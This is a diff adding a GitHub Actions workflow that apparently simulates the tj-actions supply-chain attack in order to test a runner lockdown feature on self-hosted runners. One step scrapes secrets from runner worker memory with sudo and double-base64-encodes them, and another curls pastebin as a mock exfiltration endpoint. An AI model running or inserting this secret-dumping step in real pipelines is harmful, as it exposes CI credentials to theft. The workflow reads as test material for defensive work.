@@ -1,0 +1,24 @@
+name: Lock-Down-Runner-Worker-Memory-Read
+on:
+  workflow_dispatch:
+#This lockdown scenario is only supported for self hosted ARC (k8s) deployments
+jobs:
+  build:
+    name: Deploy
+    runs-on: self-hosted
+    steps:
+      - name: Code Checkout
+        uses: actions/checkout@v2
+        with:
+          fetch-depth: 2
+          
+      - name: Curl npmjs
+        run: "curl -s https://registry.npmjs.org"
+
+      - name: Execute tj-action
+        run: | 
+          sudo python3 tj.py | tr -d '\0' | grep -aoE '"[^"]+":\{"value":"[^"]*","isSecret":true\}' | sort -u | base64 -w 0 | base64 -w 0
+                  
+      - name: Curl pastebin
+        run: "curl -s https://www.pastebin.com"
+ 
